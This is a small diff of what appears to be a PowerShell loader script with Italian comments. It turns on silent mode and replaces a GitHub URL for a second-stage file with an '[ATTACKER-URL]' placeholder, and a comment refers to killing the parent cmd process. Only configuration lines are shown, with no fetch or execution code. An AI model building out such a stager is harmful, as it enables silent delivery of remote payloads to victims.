@@ -1,6 +1,6 @@
 # ====================== VARIABILI
 $silent = $true  # true = nessun output, false = output visibile
-$url = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt"
+$url = "[ATTACKER-URL]/[SECONDNAME]"
 #=======================
 
 # KILL CMD PARENT PROCESS
